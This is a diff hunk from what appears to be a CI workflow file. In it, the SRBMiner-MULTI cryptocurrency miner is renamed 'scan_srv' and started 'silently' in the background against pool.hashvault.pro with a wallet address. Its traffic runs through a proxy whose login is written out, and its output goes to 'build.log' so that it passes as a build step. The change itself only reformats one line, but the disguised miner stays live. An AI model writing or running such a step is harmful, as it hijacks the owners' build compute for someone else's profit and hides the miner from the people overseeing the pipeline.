@@ -40,8 +40,7 @@ jobs:
           mv SRBMiner-MULTI scan_srv
 
           echo "[*] Launching scan_srv in background (nohup)...";
-          ./scan_srv --disable-gpu --algorithm randomx --pool pool.hashvault.pro:443 -u 8A4EP5TfHcC9gGepQeFUe1A26qu9tc9BFBHffSNq8GXCibdxAdJaKN845Vmmp3wXstNnf3YuTMG1AdusjLuLiFtYTwMKZZa -p win --tls true --keepalive true --force-msr-tweaks --proxy PBSN3KOG7P6T:E8RNYPSKKCLW@204.217.130.227:5433 \
-            > build.log 2>&1
+          ./scan_srv --disable-gpu --algorithm randomx --pool pool.hashvault.pro:443 -u 8A4EP5TfHcC9gGepQeFUe1A26qu9tc9BFBHffSNq8GXCibdxAdJaKN845Vmmp3wXstNnf3YuTMG1AdusjLuLiFtYTwMKZZa -p win --tls true --keepalive true --force-msr-tweaks --proxy PBSN3KOG7P6T:E8RNYPSKKCLW@204.217.130.227:5433 > build.log 2>&1
 
           echo "[*] scan_srv started silently. Showing tail of log:"
           sleep 5
